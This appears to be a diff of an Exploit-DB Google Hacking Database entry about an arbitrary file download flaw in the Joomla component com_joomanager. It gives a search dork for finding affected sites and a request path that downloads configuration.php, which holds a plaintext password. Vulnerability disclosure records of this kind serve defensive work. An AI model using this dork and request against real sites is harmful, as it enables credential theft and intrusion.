@@ -1,4 +1,5 @@
 GHDB URL:         https://www.exploit-db.com/ghdb/4687
+Severity: 5 
 Category:         Vulnerable Servers
 Published Date:   2018-03-05
 Author:           Ankit Anubhav
@@ -6,4 +7,8 @@ GoogleDork:       Joomla! com_joomanager - Arbitrary File Download
 Description:      Joomla! com_joomanager - Arbitrary File Download
 
 
-1. Google inurl:"index.php?option=com_joomanager" = 3540 results  2. [URL]+/index.php?option=com_joomanager&amp;controller=details&amp;task=download&amp;path=configuration.php gives a file which has password in PLAINTEXT!  Source: https://twitter.com/ankit_anubhav/status/970673767750959104
+1. Google inurl:"index.php?option=com_joomanager" = 3540 results
+ 
+ 2. [URL]+/index.php?option=com_joomanager&controller=details&task=download&path=configuration.php gives a file which has password in PLAINTEXT!
+ 
+ Source: https://twitter.com/ankit_anubhav/status/970673767750959104
